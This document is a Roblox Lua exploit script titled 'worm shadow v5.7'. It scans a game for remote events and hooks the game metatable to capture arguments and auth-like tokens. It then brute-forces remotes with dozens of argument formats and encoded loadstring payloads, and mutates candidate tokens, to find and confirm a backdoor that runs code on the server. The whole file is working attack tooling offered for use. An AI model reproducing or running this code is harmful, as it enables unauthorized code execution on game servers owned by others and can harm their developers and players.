-- worm shadow v5.7
print("[WS] v5.7 start")
local function __showError(msg) pcall(function() local lp=game:GetService("Players").LocalPlayer local pg=lp:FindFirstChild("PlayerGui") if not pg then return end local o=pg:FindFirstChild("WSErrorDisplay") if o then o:Destroy() end local sg=Instance.new("ScreenGui",pg) sg.Name="WSErrorDisplay" sg.ResetOnSpawn=false local f=Instance.new("Frame",sg) f.Size=UDim2.new(0,500,0,200) f.Position=UDim2.new(0.5,-250,0.5,-100) f.BackgroundColor3=Color3.fromRGB(30,0,0) f.BorderSizePixel=0 Instance.new("UICorner",f).CornerRadius=UDim.new(0,8) local s=Instance.new("UIStroke",f) s.Color=Color3.fromRGB(255,80,80) s.Thickness=2 local t=Instance.new("TextLabel",f) t.Size=UDim2.new(1,-20,1,-20) t.Position=UDim2.new(0,10,0,10) t.BackgroundTransparency=1 t.Text="ERROR:\n\n"..tostring(msg) t.TextColor3=Color3.fromRGB(255,200,200) t.Font=Enum.Font.Code t.TextSize=12 t.TextXAlignment=Enum.TextXAlignment.Left t.TextYAlignment=Enum.TextYAlignment.Top t.TextWrapped=true local c=Instance.new("TextButton",f) c.Size=UDim2.new(0,30,0,30) c.Position=UDim2.new(1,-40,0,10) c.BackgroundColor3=Color3.fromRGB(180,40,40) c.Text="X" c.Font=Enum.Font.GothamBold c.TextSize=14 c.TextColor3=Color3.new(1,1,1) c.BorderSizePixel=0 Instance.new("UICorner",c).CornerRadius=UDim.new(0,6) c.MouseButton1Click:Connect(function() sg:Destroy() end) end) end
local __bootOK,__bootErr=pcall(function()
S={Players=game:GetService("Players"),Replicated=game:GetService("ReplicatedStorage"),StarterGui=game:GetService("StarterGui"),TweenService=game:GetService("TweenService"),UserInput=game:GetService("UserInputService"),RunService=game:GetService("RunService"),HttpService=game:GetService("HttpService"),Lighting=game:GetService("Lighting"),SoundService=game:GetService("SoundService")}
LP=S.Players.LocalPlayer
PG=LP:WaitForChild("PlayerGui",10)
if not PG then error("PlayerGui timeout") end
print("[WS] init OK")
WSCFG={MAX_REMOTES=999999,WAVE_SIZE=200,VB_CAP=20,PART_TIMEOUT=2.0,HEAD_TIMEOUT=0.8,VERIFY_TIMEOUT=1.5,BRUTE_WAIT_PARALLEL=0.22,BRUTE_WAIT_SEQUENCE=0.45,BRUTE_MODE="parallel",AUTO_EXEC=false,AUTO_RESCAN=true,RESCAN_INTERVAL=3,PERSIST=false,PERSIST_URL="https://[Log in to view URL]",PERSIST_URLS={"https://[Log in to view URL]","https://[Log in to view URL]","https://[Log in to view URL]"},STATE_FILE="ws_state.json",INTEL_FILE="ws_intel.json",BLACKLIST_FILE="ws_blacklist.txt",STRICT_BACKDOOR=true,STRICT_PLAYER_FILTER=false,LOG_LIMIT=40,USE_VALUEBASE=true,USE_FOLDER_FIRST=true,USE_SINGLE_TARGET=true,AUTO_RETRY=true,RETRY_MAX=12,RESPONSE_DIFF=true,SIG_PROJECTION=true,TOKEN_REUSE=true,NESTED_ARGS=true,TIMING_FILTER=true,PAYLOAD_ENCODING=true,RANDOMIZE_SCAN=true,DERIVED_TOKENS=true,BLOCKLIST=true,TIMING_VARIANCE=true,HTTP_FALLBACK=true,CONFIDENCE_SCORE=true,SCAN_COOLDOWN=8,RF_HANG_TIMEOUT=3,HEAD_REQUIRE_CONFIRM=true,TOKEN_CRACK=true,TOKEN_MUTATE=true,ORACLE_CAP=40,SCRIPT_SCAN=true,SCRIPT_DEEP=true,SCRIPT_TOKEN_HARVEST=true,AUTO_ATTACH=true,AUTO_VERIFY_ATTACHED=true}
CFG=WSCFG
ST={Backdoor=nil,Protected=nil,Candidates={},Tagged={},Scanning=false,FoundBy="-",TestedCount=0,ScanCount=0,SkippedPlayerOwned=0,PlayerOwnedTested=0,VerifyAttempts=0,VerifyRejects=0,Log={},FailureLog={},Immunity=true,BanList={},TimeUnit="Min",SelectedBan=nil,KeepAlive=false,Retries=0,Whitelist={},CoverOn=false,ScareTarget="all",ScareRepeat=false,UserScanned=false,Locked=false,AllHits={},SingleTarget=nil,ValueBaseCache={},ArgIntel={},HookInstalled=false,HookEnabled=false,HookSupported=nil,ProtectedHits=0,RetryRuns=0,TokenPool={},ResponseHints={},SignatureCache=nil,TimingStats={fast=0,real=0,slow=0,samples={}},Blocklist={},LastScanTime=0,BackdoorConfidence=0,DerivedTokens={},IntelDirty=false,HTTPFailures=0,Oracle={},ArgDiff={},TokenCracked={},CrackAttempts=0,CrackHits=0,ScriptCache={},ScriptFindings={},RemoteRefs={},ScriptScanActive=false,ScriptPanelOpen=false,ScriptsScanned=0,ScriptTokensHarvested=0,ScriptsDecompiled=0,AutoAttached={},PendingCandidates={},AntiCheatKilled={},AntiCheatActive=false}
LogLbl=nil
function log(msg) table.insert(ST.Log,1,os.date("[%H:%M:%S] ")..tostring(msg or "")) while #ST.Log>(CFG.LOG_LIMIT or 40) do table.remove(ST.Log) end if LogLbl then LogLbl.Text=table.concat(ST.Log,"\n") end end
function logFail(remote,reason) table.insert(ST.FailureLog,1,{path=tostring(remote and remote:GetFullName() or "?"),reason=tostring(reason),t=os.time()}) while #ST.FailureLog>80 do table.remove(ST.FailureLog) end end
ALPHA={}
for c in ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"):gmatch(".") do table.insert(ALPHA,c) end
function randCode(len) len=len or 20 local t={} for i=1,len do t[i]=ALPHA[math.random(1,#ALPHA)] end return table.concat(t) end
function notify(title,text,dur) pcall(function() S.StarterGui:SetCore("SendNotification",{Title=title,Text=text,Duration=dur or 5}) end) end
function isPlayerOwned(r) if not r then return false end local a=r local d=0 while a and d<12 do if a:IsA("Player") then return true end local n=a.Name if n=="Backpack" or n=="PlayerGui" or n=="PlayerScripts" then local o=a.Parent if o and o:IsA("Player") then return true end end a=a.Parent d=d+1 end return false end
function isNoisy(r) local ok,fn=pcall(function() return r:GetFullName() end) if not ok then return true end if fn:split(".")[1]=="RobloxReplicatedStorage" then return true end if CFG.STRICT_PLAYER_FILTER and isPlayerOwned(r) then return true end if CFG.BLOCKLIST and ST.Blocklist[r.Name] then return true end local p1=r.Parent if not p1 then return false end if p1.Name=="DefaultChatSystemChatEvents" then return true end local p2=p1.Parent local p3=p2 and p2.Parent local names={p1.Name or "",(p2 and p2.Name) or "",(p3 and p3.Name) or ""} for _,n in ipairs(names) do if n:find("HDAdmin") then return true end if n=="Signals" then return true end if n=="DefaultChatSystemChatEvents" then return true end end local anc=p1 for _=1,3 do if anc then if anc.Name=="Adonis" or anc:FindFirstChild("__FUNCTION") then return true end anc=anc.Parent end end return false end
function isRealBackdoorPath(r) if not r then return false end local ok,fp=pcall(function() return r:GetFullName() end) if not ok then return false end if CFG.STRICT_PLAYER_FILTER then if fp:sub(1,8)=="Players." then return false end if fp:find("%.Backpack%.") then return false end if fp:find("%.Character%.") then return false end if fp:find("%.PlayerGui%.") then return false end end if CFG.STRICT_BACKDOOR then local root=fp:split(".")[1] local al={ReplicatedStorage=true,Workspace=true,ServerStorage=true,ServerScriptService=true,Lighting=true,SoundService=true} if not CFG.STRICT_PLAYER_FILTER then al.Players=true end if al[root] then return true end return false end return true end
function getActiveRemote(remotes) for _,r in ipairs(remotes) do local n=r.Name:lower() if n:find("cheat") or n:find("remote") then return r end end return nil end
function collectValueBases() if not CFG.USE_VALUEBASE then return {} end local vals={} local cap=CFG.VB_CAP or 20 pcall(function() for _,parent in ipairs({S.Replicated,workspace}) do for _,d in ipairs(parent:GetDescendants()) do if #vals>=cap then break end if d:IsA("ValueBase") then pcall(function() if #vals<cap then table.insert(vals,d.Value) end end) end end if #vals>=cap then break end end end) return vals end
function encodeVariants(code) if not CFG.PAYLOAD_ENCODING then return {code} end local out={code} pcall(function() local hex=code:gsub(".",function(c) return string.format("\\%d",c:byte()) end) table.insert(out,'loadstring("'..hex..'")()') end) pcall(function() local bytes={} for i=1,#code do table.insert(bytes,tostring(code:byte(i))) end table.insert(out,'loadstring(string.char('..table.concat(bytes,",")..'))()') end) return out end
function recordTiming(dt) if not CFG.TIMING_VARIANCE then return end table.insert(ST.TimingStats.samples,dt) while #ST.TimingStats.samples>100 do table.remove(ST.TimingStats.samples,1) end if dt<0.001 then ST.TimingStats.fast=ST.TimingStats.fast+1 elseif dt<0.4 then ST.TimingStats.real=ST.TimingStats.real+1 else ST.TimingStats.slow=ST.TimingStats.slow+1 end end
function deriveTokens() if not CFG.DERIVED_TOKENS then return end local pid=tostring(game.PlaceId) local uid=tostring(LP.UserId) local uname=LP.Name local combos={pid,uid,uname,pid..uid,uid..pid,uname..pid,pid..uname,"ws_"..pid,"ws_"..uid,pid.."_"..uid,uid.."_"..pid,"key_"..pid,"token_"..pid} for _,c in ipairs(combos) do if #c>=8 then ST.DerivedTokens[c]=true end end end
MAX_SAMPLES_PER_REMOTE=8
MAX_SIGS_PER_REMOTE=6
function sigOf(args) local p={} for i=1,math.min(#args,8) do local v=args[i] local t=type(v) if t=="table" then local inn={} for j=1,math.min(#v,4) do inn[j]=type(v[j]) end p[i]="table{"..table.concat(inn,",").."}" elseif t=="userdata" then p[i]="Instance" elseif t=="number" then p[i]="number" else p[i]=t end end return table.concat(p,"|") end
function looksLikeToken(s) if type(s)~="string" then return false end if #s<16 or #s>128 then return false end local a=0 for i=1,#s do local c=s:sub(i,i) if c:match("[%w+/=%-_]") then a=a+1 end end if a/#s<0.9 then return false end if s:find("function") or s:find("Instance") or s:find("game%.") then return false end return true end
function recordCall(remote,args) if not remote then return end pcall(function() local intel=ST.ArgIntel[remote] if not intel then intel={counts={},samples={},sigs={}} ST.ArgIntel[remote]=intel end local n=#args intel.counts[n]=(intel.counts[n] or 0)+1 if #intel.samples<MAX_SAMPLES_PER_REMOTE then local cp={} for i=1,n do local v=args[i] local t=type(v) if t=="table" then local inn={} for j=1,math.min(#v,6) do inn[j]=v[j] end cp[i]=inn else cp[i]=v end end table.insert(intel.samples,cp) end local s=sigOf(args) if not intel.sigs[s] then local keys={} for k in pairs(intel.sigs) do keys[#keys+1]=k end if #keys>=MAX_SIGS_PER_REMOTE then intel.sigs[keys[1]]=nil end end intel.sigs[s]=(intel.sigs[s] or 0)+1 if CFG.TOKEN_REUSE then for _,v in ipairs(args) do if type(v)=="string" and looksLikeToken(v) then ST.TokenPool[v]=(ST.TokenPool[v] or 0)+1 elseif type(v)=="table" then for _,vv in pairs(v) do if type(vv)=="string" and looksLikeToken(vv) then ST.TokenPool[vv]=(ST.TokenPool[vv] or 0)+1 end end end end ST.IntelDirty=true end) end
function installArgHook() if ST.HookInstalled then return true end local ok=pcall(function() local mt if getrawmetatable then mt=getrawmetatable(game) elseif getmetatable then mt=getmetatable(game) end if not mt then error("no mt") end local on=mt.__namecall local oi=mt.__index if not on then error("no __namecall") end if setreadonly then pcall(setreadonly,mt,false) end local nc=newcclosure or function(f) return f end local gnm=getnamecallmethod or function() return nil end mt.__namecall=nc(function(self,...) local m=gnm() if ST.HookEnabled and (m=="FireServer" or m=="InvokeServer") then recordCall(self,{...}) end return on(self,...) end) if oi then mt.__index=nc(function(self,k) local v=oi(self,k) if ST.HookEnabled and type(v)=="function" and (k=="FireServer" or k=="InvokeServer") then return nc(function(_,...) recordCall(_,{...}) return v(_,...) end) end return v end) end if setreadonly then pcall(setreadonly,mt,true) end ST.HookInstalled=true end) if not ok then ST.HookInstalled=false ST.HookSupported=false else ST.HookSupported=true end return ST.HookInstalled end
function wsEnableArgHook(on) if on then if not installArgHook() then return false,"no hook" end ST.HookEnabled=true return true else ST.HookEnabled=false return true end end

function saveIntel() if not writefile then return end pcall(function() local data={tokens=ST.TokenPool,hints=ST.ResponseHints,cracked=(function() local o={} for t,i in pairs(ST.TokenCracked) do o[t]={pos=i.pos,hits=i.hits} end return o end)(),placeId=game.PlaceId,ts=os.time()} writefile(CFG.INTEL_FILE,S.HttpService:JSONEncode(data)) ST.IntelDirty=false end) end
function loadIntel() if not readfile then return end pcall(function() local raw=readfile(CFG.INTEL_FILE) if not raw then return end local data=S.HttpService:JSONDecode(raw) if not data then return end if data.placeId~=game.PlaceId then return end if data.tokens then for k,v in pairs(data.tokens) do ST.TokenPool[k]=v end end if data.hints then for k,v in pairs(data.hints) do ST.ResponseHints[k]=v end end if data.cracked then for t,i in pairs(data.cracked) do ST.TokenCracked[t]={pos=i.pos,hits=i.hits,remote=nil} end end end) end
function loadBlocklist() if not readfile then return end pcall(function() local raw=readfile(CFG.BLACKLIST_FILE) if not raw then return end for line in raw:gmatch("[^\n]+") do line=line:gsub("^%s+",""):gsub("%s+$","") if line~="" and not line:find("^#") then ST.Blocklist[line]=true end end end) end
function computeGameSignature() local sc={} local sh={} local tot=0 for _,intel in pairs(ST.ArgIntel) do for sig,c in pairs(intel.sigs) do sc[sig]=(sc[sig] or 0)+c end for n,c in pairs(intel.counts) do sh[n]=(sh[n] or 0)+c tot=tot+c end end local ts={} for s,c in pairs(sc) do table.insert(ts,{sig=s,count=c}) end table.sort(ts,function(a,b) return a.count>b.count end) local tc={} for n,c in pairs(sh) do table.insert(tc,{n=n,count=c}) end table.sort(tc,function(a,b) return a.count>b.count end) ST.SignatureCache={sigs=ts,counts=tc,total=tot} return ST.SignatureCache end
RESPONSE_HINTS={"token","auth","invalid","missing","expected","denied","unauthorized","forbidden","required","expired","wrong","incorrect","not%sfound","not%sallowed","whitelist","blacklist"}
function analyzeResponse(remote,result) if not CFG.RESPONSE_DIFF then return end if result==nil then return end local str local t=type(result) if t=="string" then str=result elseif t=="table" then local ok,enc=pcall(function() return S.HttpService:JSONEncode(result) end) if ok then str=enc end elseif t=="boolean" then if result==false then ST.ResponseHints["__rejected"]=(ST.ResponseHints["__rejected"] or 0)+1 end return else str=tostring(result) end if not str or #str==0 or #str>2048 then return end local low=str:lower() for _,hint in ipairs(RESPONSE_HINTS) do if low:find(hint) then ST.ResponseHints[hint]=(ST.ResponseHints[hint] or 0)+1 if hint=="token" or hint=="auth" then for q in str:gmatch('"([^"]+)"') do if looksLikeToken(q) then ST.TokenPool[q]=(ST.TokenPool[q] or 0)+1 end end for q in str:gmatch("'([^']+)'") do if looksLikeToken(q) then ST.TokenPool[q]=(ST.TokenPool[q] or 0)+1 end end end end end end
MAX_ORACLE_PER_REMOTE=CFG.ORACLE_CAP or 40
function argsKey(args) local p={} for i=1,math.min(#args,8) do local v=args[i] local t=type(v) if t=="string" then p[i]="s:"..tostring(#v) elseif t=="number" then p[i]="n:"..tostring(v) elseif t=="boolean" then p[i]="b:"..tostring(v) elseif t=="table" then local k={} for j,vv in pairs(v) do k[#k+1]=tostring(j).."="..type(vv) end table.sort(k) p[i]="t:{"..table.concat(k,",").."}" elseif t=="userdata" then p[i]="i:"..tostring(v.ClassName or "?") else p[i]=t end end return table.concat(p,"|") end
function normalizeResponse(r) if r==nil then return nil end local t=type(r) if t=="string" then if #r>512 then return r:sub(1,512).."..." end return r elseif t=="boolean" or t=="number" then return tostring(r) elseif t=="table" then local ok,enc=pcall(function() return S.HttpService:JSONEncode(r) end) if ok and #enc<1024 then return enc end return "[table]" end return "["..t.."]" end
function oracleRecord(remote,args,response,dt) if not remote then return end local k=argsKey(args) local orc=ST.Oracle[remote] if not orc then orc={} ST.Oracle[remote]=orc end orc[k]={args=args,response=response,norm=normalizeResponse(response),ts=os.time(),dt=dt} local count=0 local oldK,oldT for kk,vv in pairs(orc) do count=count+1 if not oldT or vv.ts<oldT then oldT=vv.ts oldK=kk end end if count>MAX_ORACLE_PER_REMOTE and oldK then orc[oldK]=nil end end
TOKEN_PATTERNS={ '"(.-)"',"'(.-)'","key=([%w_%-]+)","token=([%w_%-]+)","auth=([%w_%-]+)","`(.-)`","(%x%x%x%x%x%x%x%x%x%x%x%x+)","([%w+/=][%w+/=][%w+/=][%w+/=][%w+/=][%w+/=][%w+/=][%w+/=]+)"}
function extractTokensFromResponse(str) if type(str)~="string" then return {} end local f={} for _,pat in ipairs(TOKEN_PATTERNS) do for cap in str:gmatch(pat) do if looksLikeToken(cap) then f[cap]=true end end end pcall(function() local dec=S.HttpService:JSONDecode(str) local function walk(v) if type(v)=="string" and looksLikeToken(v) then f[v]=true elseif type(v)=="table" then for _,vv in pairs(v) do walk(vv) end end end walk(dec) end) return f end
function mutateToken(tok) if not CFG.TOKEN_MUTATE then return {} end local o={} local function add(s) if type(s)=="string" and #s>=8 and #s<=256 and s~=tok then o[s]=true end end add(tok:upper()) add(tok:lower()) for _,p in ipairs({"Bearer ","Token ","Key ","bearer "}) do add(p..tok) end add(tok:gsub("^%s+",""):gsub("%s+$","")) add(tok:reverse()) local sw=tok:gsub("%a",function(c) if c==c:lower() then return c:upper() else return c:lower() end end) add(sw) local l={} for k in pairs(o) do table.insert(l,k) end return l end
HINT_PATTERNS={"missing arg[%s_]*([%d]+)","expected arg[%s_]*([%d]+)","arg[%s_]*([%d]+)[%s_]*is[%s_]*required","argument[%s_]*([%d]+)[%s_]*required","slot[%s_]*([%d]+)","param[%s_]*([%d]+)","position[%s_]*([%d]+)"}
function parseArgHint(str) if type(str)~="string" then return nil end local low=str:lower() for _,pat in ipairs(HINT_PATTERNS) do local n=low:match(pat) if n then local num=tonumber(n) if num and num>=1 and num<=10 then return num end end end return nil end
function crackTokensFor(remote,bArgs,bNorm) if not remote then return false end if not CFG.TOKEN_CRACK then return false end local cands={} for tok in pairs(ST.TokenPool) do table.insert(cands,tok) end for tok in pairs(ST.DerivedTokens) do table.insert(cands,tok) end if #cands==0 then return false end table.sort(cands,function(a,b) return (ST.TokenPool[a] or 0)>(ST.TokenPool[b] or 0) end) if #cands>8 then local tr={} for i=1,8 do tr[i]=cands[i] end cands=tr end local ms=math.max(#bArgs,3) for pos=1,ms do for _,tok in ipairs(cands) do local ml={tok} for _,mt in ipairs(mutateToken(tok)) do if #ml<4 then table.insert(ml,mt) end end for _,uTok in ipairs(ml) do ST.CrackAttempts=ST.CrackAttempts+1 local args={} for i=1,ms do if i==pos then args[i]=uTok elseif bArgs[i]~=nil then args[i]=bArgs[i] else args[i]="" end end local t0=tick() local result pcall(function() if remote:IsA("RemoteEvent") then remote:FireServer(unpack(args)) elseif remote:IsA("RemoteFunction") then result=remote:InvokeServer(unpack(args)) end end) local dt=tick()-t0 oracleRecord(remote,args,result,dt) local norm=normalizeResponse(result) if norm and bNorm and norm~=bNorm then local dl=math.abs(#norm-#bNorm) if dl>4 or not norm:find(bNorm,1,true) then ST.TokenCracked[uTok]={remote=remote,args=args,pos=pos,hits=(ST.TokenCracked[uTok] and ST.TokenCracked[uTok].hits or 0)+1} ST.TokenPool[uTok]=(ST.TokenPool[uTok] or 0)+5 ST.CrackHits=ST.CrackHits+1 log("   crack: "..uTok:sub(1,12).." @"..pos) return true end end task.wait(0.06+math.random()*0.05) end end end return false end
__orig_analyzeResponse=analyzeResponse
function analyzeResponseV54(remote,result) if __orig_analyzeResponse then pcall(__orig_analyzeResponse,remote,result) end if not CFG.TOKEN_CRACK then return end local norm=normalizeResponse(result) if norm then local toks=extractTokensFromResponse(norm) for t in pairs(toks) do ST.TokenPool[t]=(ST.TokenPool[t] or 0)+1 end end end
analyzeResponse=analyzeResponseV54
VERIFY_FORMATS={function(code) return {code} end,function(code) return {"exec",code} end,function(code) return {"execute",code} end,function(code) return {"loadstring",code} end,function(code) return {{code=code}} end,function(code) return {{script=code}} end,function(code) return {code,"execute"} end,function(code) return {code,game.Players.LocalPlayer} end,function(code) return {"run",code} end,function(code) return {"eval",code} end,function(code) return {"cmd",code} end,function(code) return {"admin",code} end,function(code) return {"load",code} end,function(code) return {"script",code} end,function(code) return {"code",code} end,function(code) return {"lua",code} end,function(code) return {{code=code,exec=true}} end,function(code) return {{script=code,exec=true}} end,function(code) return {{source=code}} end,function(code) return {{lua=code}} end,function(code) return {{code,"exec"}} end,function(code) return {{"exec",code}} end,function(code) return {{[1]=code}} end,function(code) return {{[1]="exec",[2]=code}} end,function(code) return {code,""} end,function(code) return {code,0} end,function(code) return {code,false} end,function(code) return {"",code} end,function(code) return {0,code} end,function(code) return {code,nil,nil} end,function(code) return {{args={code}}} end,function(code) return {{data={source=code}}} end,function(code) return {{payload={code=code}}} end,function(code) return {{exec=true,args={code}}} end,function(code) return {{cmd="exec",args={code}}} end,function(code) return {{action="execute",data=code}} end,function(code) return {{type="lua",code=code}} end,function(code) return {{kind="script",body=code}} end,function(code) return {{[1]={code}}} end,function(code) return {{[1]="exec",[2]={code}}} end}

function inferArgs(remote,code,vbs) local cands={} local seen={} local function push(a) local s=sigOf(a) local k=s.."#"..tostring(#a).."#"..tostring(a[1]) if seen[k] then return end seen[k]=true table.insert(cands,a) end local tl={} if CFG.TOKEN_REUSE then for tok,cnt in pairs(ST.TokenPool) do table.insert(tl,{tok=tok,cnt=cnt}) end table.sort(tl,function(a,b) return a.cnt>b.cnt end) end local topTok=tl[1] and tl[1].tok or nil local dl={} if CFG.DERIVED_TOKENS then for tok in pairs(ST.DerivedTokens) do table.insert(dl,tok) end end local intel=ST.ArgIntel[remote] if intel then local counts={} for n,c in pairs(intel.counts) do table.insert(counts,{n=n,c=c}) end table.sort(counts,function(a,b) return a.c>b.c end) for _,e in ipairs(counts) do local n=e.n for _,smp in ipairs(intel.samples) do if #smp==n then local args={} local cp=false for i=1,n do local v=smp[i] local t=type(v) if not cp and t=="string" and #tostring(v)>8 then args[i]=code cp=true elseif t=="table" then local cl={} for j=1,#v do cl[j]=v[j] end if not cp then table.insert(cl,code) cp=true end args[i]=cl else args[i]=v end end if not cp then args[#args+1]=code end push(args) break end end end for sig in pairs(intel.sigs) do local parts={} for p in sig:gmatch("[^|]+") do parts[#parts+1]=p end for i=1,#parts do if parts[i]=="string" then local args={} for j=1,#parts do if j==i then args[j]=code elseif parts[j]=="number" then args[j]=0 elseif parts[j]=="boolean" then args[j]=false elseif parts[j]=="string" then args[j]="" elseif parts[j]:sub(1,5)=="table" then args[j]={code} else args[j]=nil end end push(args) end end end end if CFG.SIG_PROJECTION then local sig=computeGameSignature() if sig and sig.total>10 then for i=1,math.min(5,#sig.sigs) do local e=sig.sigs[i] local parts={} for p in e.sig:gmatch("[^|]+") do parts[#parts+1]=p end for si=1,#parts do if parts[si]=="string" then local args={} for j=1,#parts do if j==si then args[j]=code elseif parts[j]=="number" then args[j]=0 elseif parts[j]=="boolean" then args[j]=false elseif parts[j]=="string" then args[j]="" elseif parts[j]:sub(1,5)=="table" then args[j]={code} else args[j]=nil end end push(args) end end end end end for _,b in ipairs(VERIFY_FORMATS) do local ok,args=pcall(b,code) if ok and args then push(args) end end if topTok then push({topTok,code}) push({topTok,"exec",code}) push({code,topTok}) push({"exec",topTok,code}) push({{token=topTok,code=code}}) push({{auth=topTok,script=code}}) end for _,dt in ipairs(dl) do push({dt,code}) push({"exec",dt,code}) push({{token=dt,code=code}}) end for tok,info in pairs(ST.TokenCracked) do if info.remote==remote then local args={} for i=1,math.max(#(info.args or {}),info.pos) do args[i]=(info.args and info.args[i]) or "" end args[info.pos]=tok args[#args+1]=code push(args) end end for n=0,5 do local args={} for i=1,n do if i==1 then args[i]=code elseif i<=#vbs then args[i]=vbs[i] else args[i]="" end end push(args) end return cands end
function verifyBackdoor_inferred(remote) if not remote then return false end if not isRealBackdoorPath(remote) then ST.VerifyRejects=ST.VerifyRejects+1 logFail(remote,"path rejected") return false end ST.VerifyAttempts=ST.VerifyAttempts+1 local markers={} local payloads={} for i=1,5 do local m="WSCONFIRM_"..randCode(10).."_"..i table.insert(markers,m) if i==1 then table.insert(payloads,string.format("(function() local p=Instance.new('Part') p.Name='%s' p.Anchored=true p.CanCollide=false p.Transparency=1 p.Size=Vector3.new(1,1,1) p.Parent=workspace end)()",m)) elseif i==2 then table.insert(payloads,string.format("(function() local p=Instance.new('Model') p.Name='%s' p.Parent=workspace end)()",m)) elseif i==3 then table.insert(payloads,string.format("(function() local v=Instance.new('BoolValue') v.Name='%s' v.Parent=game:GetService('ReplicatedStorage') end)()",m)) elseif i==4 then table.insert(payloads,string.format("(function() local v=Instance.new('StringValue') v.Name='%s' v.Parent=game:GetService('ReplicatedStorage') end)()",m)) else table.insert(payloads,string.format("(function() local v=Instance.new('IntValue') v.Name='%s' v.Parent=game:GetService('ReplicatedStorage') end)()",m)) end end local vbs=ST.ValueBaseCache or {} local cap=CFG.VB_CAP or 20 if #vbs>cap then local c={} for i=1,cap do c[i]=vbs[i] end vbs=c end local function fireOnce(args) local t0=tick() local result local done=false local ok=pcall(function() if remote:IsA("RemoteEvent") then remote:FireServer(unpack(args)) done=true elseif remote:IsA("RemoteFunction") then local co=coroutine.create(function() local r=remote:InvokeServer(unpack(args)) result=r end) coroutine.resume(co) local ws=tick() while coroutine.status(co)~="dead" and tick()-ws<CFG.RF_HANG_TIMEOUT do task.wait(0.01) end done=coroutine.status(co)=="dead" end end) local dt=tick()-t0 recordTiming(dt) if CFG.TOKEN_CRACK then oracleRecord(remote,args,result,dt) end if ok and result~=nil then pcall(analyzeResponse,remote,result) end return ok,dt end local function scanMarkers() for _,m in ipairs(markers) do local p=workspace:FindFirstChild(m) or S.Replicated:FindFirstChild(m) if p then pcall(function() p:Destroy() end) return true end end return false end local cands={} local cvs=encodeVariants(payloads[1]) for _,cv in ipairs(cvs) do local cs=inferArgs(remote,cv,vbs) for _,a in ipairs(cs) do table.insert(cands,a) end end for _,args in ipairs(cands) do fireOnce(args) task.wait(0.04+math.random()*0.05) if scanMarkers() then if CFG.CONFIDENCE_SCORE then ST.BackdoorConfidence=math.min(100,ST.BackdoorConfidence+15) end return true end end local top={} for i=1,math.min(3,#cands) do top[i]=cands[i] end for pi=2,#payloads do local c2=inferArgs(remote,payloads[pi],vbs) local mix={} for i=1,math.min(6,#c2) do mix[#mix+1]=c2[i] end for i=1,#top do mix[#mix+1]=top[i] end for _,args in ipairs(mix) do fireOnce(args) task.wait(0.04+math.random()*0.05) if scanMarkers() then if CFG.CONFIDENCE_SCORE then ST.BackdoorConfidence=math.min(100,ST.BackdoorConfidence+15) end return true end end end local start=tick() while tick()-start<CFG.VERIFY_TIMEOUT do if scanMarkers() then if CFG.CONFIDENCE_SCORE then ST.BackdoorConfidence=math.min(100,ST.BackdoorConfidence+10) end return true end S.RunService.Heartbeat:Wait() end if CFG.TOKEN_CRACK then local orc=ST.Oracle[remote] if orc then local bArgs,bNorm for _,v in pairs(orc) do if v.args and #v.args>=1 then bArgs=v.args bNorm=v.norm break end end if bArgs then local gate=mineArgGate(remote) if crackTokensFor(remote,bArgs,bNorm) then if gate and gate.gateIndex then local nArgs={} for i=1,#bArgs do nArgs[i]=bArgs[i] end for tok,info in pairs(ST.TokenCracked) do if info.remote==remote then nArgs[info.pos]=tok break end end nArgs[gate.gateIndex]=payloads[1] local t0=tick() local res pcall(function() if remote:IsA("RemoteEvent") then remote:FireServer(unpack(nArgs)) elseif remote:IsA("RemoteFunction") then res=remote:InvokeServer(unpack(nArgs)) end end) oracleRecord(remote,nArgs,res,tick()-t0) local s2=tick() while tick()-s2<0.8 do if scanMarkers() then ST.BackdoorConfidence=math.min(100,ST.BackdoorConfidence+25) return true end S.RunService.Heartbeat:Wait() end end end end end end ST.VerifyRejects=ST.VerifyRejects+1 logFail(remote,"no marker") return false end
verifyBackdoor=function(r) return verifyBackdoor_inferred(r) end
function mineArgGate(remote) local orc=ST.Oracle[remote] if not orc then return nil end local samples={} for _,v in pairs(orc) do table.insert(samples,v) end if #samples<3 then return nil end local groups={} for _,s in ipairs(samples) do local k=s.norm or "__nil__" groups[k]=groups[k] or {} table.insert(groups[k],s) end local gk={} for k in pairs(groups) do table.insert(gk,k) end if #gk<2 then return nil end local ml=0 for _,s in ipairs(samples) do if #s.args>ml then ml=#s.args end end local bi,bs=nil,0 for i=1,ml do local sc=0 for _,k in ipairs(gk) do local tg={} for _,s in ipairs(groups[k]) do local t=type(s.args[i]) tg[t]=(tg[t] or 0)+1 end local d=0 for _ in pairs(tg) do d=d+1 end if d==1 then sc=sc+1 end end if sc>bs then bs=sc bi=i end end if bi then ST.ArgDiff[remote]={gateIndex=bi,confidence=bs/#gk} return ST.ArgDiff[remote] end return nil end
function buildPartPayload(code) return "(function() local a=Instance.new('Model') a.Name='"..code.."' a.Parent=workspace end)()" end
function fireAny(r,payload) if not r then return end if r:IsA("RemoteEvent") then pcall(function() r:FireServer(payload) end) elseif r:IsA("RemoteFunction") then task.spawn(function() local result local co=coroutine.create(function() result=r:InvokeServer(payload) end) coroutine.resume(co) local ws=tick() while coroutine.status(co)~="dead" and tick()-ws<CFG.RF_HANG_TIMEOUT do task.wait(0.01) end if result~=nil then pcall(analyzeResponse,r,result) end end) end end
function collectRemotes() local list,n={},0 local skipped=0 local pt=0 local maxR=CFG.MAX_REMOTES local seen={} local function add(o) if seen[o] then return end if n>=maxR then return end seen[o]=true local isP=isPlayerOwned(o) if CFG.STRICT_PLAYER_FILTER and isP then skipped=skipped+1 elseif not isNoisy(o) then n=n+1 list[n]=o if isP then pt=pt+1 end else if isP then skipped=skipped+1 end end end if CFG.USE_FOLDER_FIRST then pcall(function() for _,o in ipairs(game:GetDescendants()) do if n>=maxR then break end if o:IsA("Folder") then for _,c in ipairs(o:GetChildren()) do if c:IsA("RemoteEvent") or c:IsA("RemoteFunction") then add(c) end end end end end) end for _,o in ipairs(game:GetDescendants()) do if n>=maxR then break end if o:IsA("RemoteEvent") or o:IsA("RemoteFunction") then add(o) end end pcall(function() local js=game:GetService("JointsService") for _,o in ipairs(js:GetDescendants()) do if o:IsA("RemoteEvent") or o:IsA("RemoteFunction") then add(o) end end end) if CFG.RANDOMIZE_SCAN then for i=#list,2,-1 do local j=math.random(1,i) list[i],list[j]=list[j],list[i] end end ST.SkippedPlayerOwned=skipped ST.PlayerOwnedTested=pt return list end
